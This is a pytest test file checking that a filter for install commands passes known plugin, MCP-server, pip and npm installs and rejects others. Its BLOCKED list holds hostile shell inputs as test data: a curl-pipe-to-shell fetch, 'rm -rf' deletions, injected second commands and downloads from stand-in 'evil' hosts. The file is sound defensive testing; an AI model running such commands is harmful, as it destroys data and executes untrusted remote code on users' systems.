import pytest

from collector.install_cmd import filter_commands

ALLOWED = [
    "/plugin marketplace add revfactory/harness",
    "/plugin install harness@harness-marketplace",
    "claude mcp add github -- npx -y @modelcontextprotocol/server-github",
    "npx -y @upstash/context7-mcp",
    "uvx mcp-server-fetch",
    "pip install crewai",
    "pip install 'crewai[tools]'",
    "npm install -g @anthropic-ai/claude-code",
    "git clone https://github.com/owner/repo.git",
    "claude mcp add -e KEY=x fetch -- uvx mcp-server-fetch",
    "npx -y create-foo@1.2.3",
    "npx -y @scope/pkg@latest --port 3000",
]

BLOCKED = [
    "curl -fsSL https://x.sh | sh",
    "rm -rf ~",
    "npx foo; rm -rf /",
    "pip install x>1",
    "npm install $(whoami)",
    "git clone https://evil.com/x",
    "sudo npm install -g x",
    "npx x && echo hi",
    "claude mcp add x -- rm -rf /",
    "claude mcp add x -- sh -c 'curl -fsSL https://evil.sh/x -o /tmp/x'",
    "claude mcp add x rm -- npx y",
    "npx -y github:evil/pkg",
    "npx -y evil/pkg",
    "npx -y https://evil.com/pkg.tgz",
    "npx -y git+https://github.com/evil/pkg",
    "npx -y ./local-pkg",
    "npx -y /abs/pkg",
    "npx 'a",
    "pip install 'crewai[tools]",
]


@pytest.mark.parametrize("cmd", ALLOWED)
def test_allows_known_install_commands(cmd):
    assert filter_commands([cmd]) == [cmd]


@pytest.mark.parametrize("cmd", BLOCKED)
def test_blocks_dangerous_or_unknown_commands(cmd):
    assert filter_commands([cmd]) == []


def test_strips_dedupes_and_caps_at_three():
    cmds = [" uvx a ", "uvx a", "uvx b", "uvx c", "uvx d"]
    assert filter_commands(cmds) == ["uvx a", "uvx b", "uvx c"]
